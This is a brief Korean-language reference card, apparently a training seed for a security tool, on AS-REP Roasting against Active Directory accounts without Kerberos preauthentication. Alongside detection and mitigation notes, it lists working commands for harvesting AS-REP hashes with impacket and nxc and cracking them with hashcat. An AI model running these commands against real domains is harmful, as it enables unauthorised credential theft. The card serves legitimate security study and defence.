# 학습 시드(심화): as-rep

> 종합 레퍼런스(확립된 보안 지식 · 권위 출처 검증가능). 라이브 최신화: `assassin --learn as-rep`. P1: 머신별 라이트업 미참조.

## 개요
AS-REP Roasting(T1558.004): 사전인증 비활성 계정의 AS-REP 를 받아 오프라인 크랙.

## 핵심 기법 · 열거
- DONT_REQ_PREAUTH 플래그 계정 대상
- 인증 없이도 가능(사용자명만)

## 표준 도구 · 명령
```
impacket-GetNPUsers <domain>/ -usersfile u.txt -no-pass -format hashcat
nxc ldap <dc> -u user -p pass --asreproast out.txt
hashcat -m 18200 asrep.txt rockyou.txt
```

## 블루팀 탐지
4768 사전인증 없는 AS-REQ·DONT_REQ_PREAUTH 계정 활동.

## 완화
모든 계정 사전인증 필수화·강한 암호·플래그 감사.

- 출처(검증): https://attack.mitre.org/techniques/T1558/004/
